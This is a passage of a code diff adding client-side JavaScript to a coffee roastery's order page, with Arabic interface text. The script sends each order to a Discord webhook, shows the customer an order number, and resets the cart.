+                footer: { text: "نظام طلبات محمصة لورا" },
+                timestamp: new Date()
+            }]
+        };
+
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).then(() => {
+            alert(`تم استلام طلبك بنجاح!\nرقم الطلب الخاص بك هو: ${orderID}`);
+            incrementOrderNumber();
+            cart = [];
+            document.getElementById('cartCount').innerText = '0';
+            closeModal('cartModal');
+        }).catch((err) => {
+            console.error(err);
+            alert('حدث خطأ أثناء إرسال الطلب، يرجى المحاولة لاحقاً.');
+        });
+    }
+</script>
 </body>
 </html>
